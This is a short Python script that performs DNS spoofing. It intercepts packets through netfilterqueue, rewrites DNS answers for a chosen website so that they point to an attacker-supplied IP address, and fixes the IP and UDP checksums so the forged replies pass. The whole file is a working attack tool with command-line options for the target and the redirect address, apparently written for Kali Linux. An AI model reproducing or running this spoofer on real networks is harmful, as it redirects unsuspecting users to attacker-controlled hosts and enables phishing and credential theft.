#!/usr/bin/env python
import os
import netfilterqueue
import argparse


# Ensure we can import scapy
os.sys.path += ['/home/kali/.local/lib/python2.7/site-packages']
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if target_website in qname:
            print('[+] Spoofing "{}" redirecting to {}'.format(target_website, redirect_ip))
            answer = scapy.DNSRR(rrname=qname, rdata=redirect_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))
    packet.accept()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', dest='target_website', help='Website address to spoof.', required=True)
    parser.add_argument('-r', dest='redirect_ip', help='Redirect IP address.', required=True)
    args = parser.parse_args()
    target_website = args.target_website
    redirect_ip = args.redirect_ip

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)  # 0 is the identifiable number passed as --queue-num param
    queue.run()

